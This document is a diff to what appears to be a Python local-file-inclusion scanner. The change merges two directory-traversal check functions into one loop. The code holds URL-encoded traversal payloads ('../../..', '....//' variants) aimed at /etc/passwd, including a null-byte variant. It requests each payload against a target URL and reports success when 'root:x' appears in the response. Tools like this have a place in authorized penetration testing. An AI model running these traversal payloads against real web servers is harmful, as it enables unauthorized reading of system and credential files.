@@ -22,8 +22,7 @@ from termcolor import colored
 
 # The quote method automatically url encodes the string
 linux_dirTraversal = [quote("../../../../../../.."), quote("/../../../../../../.."), quote("....//....//....//....//....//....//..../"), quote("//....//....//....//....//....//....//..../"), quote(".././.././.././.././.././.."), quote("/.././.././.././.././.././..")]
-path1 = quote("/etc/passwd")
-path2 = "/etc/passwd%00"
+path1 = [quote("/etc/passwd"), "/etc/passwd%00"]
 
 # Filter
 filterPaths = [quote("/etc/passwd"), quote("index"), quote("index.php"), quote("index.html")]
@@ -49,7 +48,7 @@ def urlCheck(url):
 		openn = urlopen(url)
 		return True	
 	except Exception as e:
-		print(colored('[-]', 'red', attrs=['bold']) + ' Not a valid URL for LFI, ', e)
+		print(colored('[-]', 'red', attrs=['bold']) + ' Something went wrong, ', e)
 		print(colored('[!]', 'yellow', attrs=['bold']) + ' The URL format must be http://[URL]?[something]=')
 		return False
 		
@@ -68,25 +67,14 @@ def stripHtmlTags(t):
 # Checks for directory traversal
 def dirTraversalCheck(url):
 	for i in linux_dirTraversal:
-		compUrl = url + i + path1
-		check = urlopen(compUrl)
-		response = check.read().decode('utf-8')
-		clean = stripHtmlTags(response)
-		if 'root:x' in clean.lower():
-			print(colored('[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl)
+		for n in path1:
+			compUrl = url + i + n
+			check = urlopen(compUrl)
+			response = check.read().decode('utf-8')
+			clean = stripHtmlTags(response)
+			if 'root:x' in clean.lower():
+				print(colored('[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl)
 
-
-
-
-def dirTraversalCheck2(url):
-	for i in linux_dirTraversal:
-		compUrl = url + i + path2
-		check = urlopen(compUrl)
-		response = check.read().decode('utf-8')
-		clean = stripHtmlTags(response)
-		if 'root:x' in clean.lower():
-			print(colored('[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl)
-	
 
 
 
